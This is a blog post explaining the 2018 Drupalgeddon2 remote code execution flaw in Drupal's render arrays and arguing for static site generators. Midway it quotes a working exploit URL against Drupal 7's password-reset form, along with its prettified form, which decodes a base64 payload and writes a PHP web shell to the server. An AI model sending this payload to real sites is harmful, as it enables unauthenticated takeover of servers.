---
layout: post
title: Drupalgeddon2 and the danger of CMSs
permalink: /drupalgeddon2
tags: infosec
---

Yesterday I gave a talk on [Drupalgeddon2](https://arstechnica.com/information-technology/2018/04/drupalgeddon2-touches-off-arms-race-to-mass-exploit-powerful-web-servers/) to a group of security enthusiasts and software developers. Drupal is a content management system (CMS) which powers up to 5% of all websites, including websites of [most of the world's governments](https://groups.drupal.org/government-sites), so an unauthenticated remote code execution vulnerability in it is a Very Big Deal.

It has become impossible to ignore the political effects of exploits like this in recent years. The [original Drupalgeddon](https://www.drupal.org/project/drupalgeddon) is [suspected](https://www.drupal.org/forum/general/general-discussion/2016-05-04/so-was-drupal-used-for-the-mossack-fonseca-leak-or-not) of being the method used by hackers to obtain the [Panama Papers](https://en.wikipedia.org/wiki/Panama_Papers). However, what I want to discuss here are some technical details of the Drupalgeddon2 exploit itself, where it came from, and why using CMSs in 2018 is generally a bad idea.

Since version 6, central to Drupal's extensibility has been the concept of ["render arrays"](https://www.drupal.org/docs/8/api/render-api/render-arrays). Internally, Drupal represents the elements of a page as a tree of structured PHP arrays, somewhat like a [DOM](https://en.wikipedia.org/wiki/Document_Object_Model) for the backend. Eventually, the arrays are fed into Drupal's [rendering logic](https://github.com/drupal/drupal/blob/e81312ba480f77becccb29bfb0bc5a7d311aeea5/core/lib/Drupal/Core/Render/Renderer.php) which transforms them into HTML and sends them to the client. Rendering occurs both when a client initially loads the page, and when making an AJAX request upon submitting a form. Drupal admins and plugin authors can make use of a powerful [API](https://api.drupal.org/api/drupal/elements) to manipulate the data held in these arrays.

Here is an example of a Login Button represented as a render array with the Drupal Form API:

```php
$form['actions']['submit'] = array(
  '#type' => 'submit',
  '#markup' => '<span>' . t('Login') . '</span>',
  '#submit' => array( 'login_callback' ),
  '#prefix' => '<button type="submit">',
  '#suffix' => '</button>',
);
```

The flexibility that this provides to web developers is huge. Attributes can be added which specify functions to modify the array at any stage during the rendering process, for instance `#pre_render` or `#post_render`.

However, this flexibility comes at the cost of a large attack surface.

The Drupalgeddon2 exploit involves getting a render array containing a shell payload directly executed on the backend using one of these rendering function callbacks. In the [most polished exploit](https://github.com/dreadlocked/Drupalgeddon2), popping a shell on a Drupal 7 server is done like so:

```
/?q=user/password&name[#post_render][]=passthru&name[#type]=markup&name[#markup]=echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee ./s.php
```

Which, prettified, is submitting the following render array to the 'reset password' form:

```php
$name = [
  '#post_render' => ['passthru'], // Like exec, passthru 'passes through' to the system and executes a command
  '#type' => 'markup',
  '#markup' => 'echo PD9waH... | base64 -d | tee ./s.php' // Writes a minimal PHP shell
]
```

When I demonstrated this exploit to the audience, they were shocked. "You can just send that to the backend and it executes it unauthenticated?" "How does Drupal allow that?"

I think the more interesting question is: "if the vulnerability really is that simple, how did it take seven years for somebody to spot it?"

Perhaps intelligence agencies or other groups were aware of it, but&mdash;speculation aside&mdash;even after [the patch](https://github.com/drupal/drupal/commit/19b69fe8af55d8fac34a50563a238911b75f08f7) was publicly released, it still took security researchers two weeks to come up with an exploit.

This vulnerability, and those that continue to be discovered, show that Drupal is a web platform that's perhaps too powerful for its own good. It's jam-packed with features added by hundreds of contributors since 2000. It has so many features and such complex logic that, even after finding out the vulnerability involved non-whitelisted array keys starting with `#`, experts were hunting through the code for days trying to understand how to write an exploit for it.

It's not just Drupal that's implicated here. The majority of use-cases for CMSs would be better served by static site generators. Static sites are immune by default to the kinds of crazy vulnerabilities lurking in CMSs. They come with a host of [other benefits](https://www.netlify.com/blog/2016/05/18/9-reasons-your-site-should-be-static/). Previously, the main disadvantage of static site generators was that they were hard to use for non-technical people, but tooling has improved significantly in recent years.

I don't know if there will be a Drupalgeddon3, but I'm certain that as long as most of the web runs on ancient, monolithic PHP platforms, huge bugs like this will continue to be found, and will continue to cause great alarm. Or great amusement, if you are 'that kind' of person in cybersecurity.

### Credit

[Check Point Research](https://research.checkpoint.com/uncovering-drupalgeddon-2/) for being the first to describe the vulnerability.

